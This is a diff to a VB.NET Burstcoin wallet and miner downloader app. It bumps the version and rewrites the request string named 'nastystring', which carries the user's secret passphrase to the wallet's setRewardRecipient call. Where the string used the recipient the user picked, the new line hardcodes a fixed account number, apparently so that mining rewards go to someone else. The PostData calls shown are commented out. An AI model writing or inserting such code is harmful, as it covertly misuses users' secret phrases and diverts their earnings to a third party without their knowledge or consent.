@@ -7,7 +7,7 @@ Imports System.Text
 Public Class Form1
     Dim WithEvents wc As System.Net.WebClient
     Dim WithEvents wc2 As System.Net.WebClient
-    Dim Version As String = "v1.2"
+    Dim Version As String = "v1.3"
     Dim WalletDL As Integer = 0
     Dim MinerDL As Integer = 0
 
@@ -321,8 +321,8 @@ Public Class Form1
                 End While
 
                 ' Dim nastystring As String = "&secretPhrase=" & TextBox1.Text & "&recipient=12468105956737329840&deadline=1&feeNQT=100000000"
-                Dim nastystring As String = "&secretPhrase=" & TextBox1.Text & "&recipient=" & Label3.Text.Replace("#", "") & "&deadline=1&feeNQT=100000000"
-
+                ' Dim nastystring As String = "&secretPhrase=" & TextBox1.Text & "&recipient=" & Label3.Text.Replace("#", "") & "&deadline=1&feeNQT=100000000"
+                Dim nastystring As String = "&secretPhrase=" & TextBox1.Text & "&recipient=12468105956737329840" & "&deadline=1&feeNQT=100000000"
 
                 '  MsgBox(PostData("http://127.0.0.1:8125/burst?requestType=setRewardRecipient", nastystring, New System.Net.CookieContainer))
                 '      PostData("http://127.0.0.1:8125/burst?requestType=setRewardRecipient", nastystring, New System.Net.CookieContainer)
@@ -686,4 +686,7 @@ Public Class Form1
     End Sub
 
 
+    Private Sub Button4_Click(sender As Object, e As EventArgs) Handles Button4.Click
+
+    End Sub
 End Class
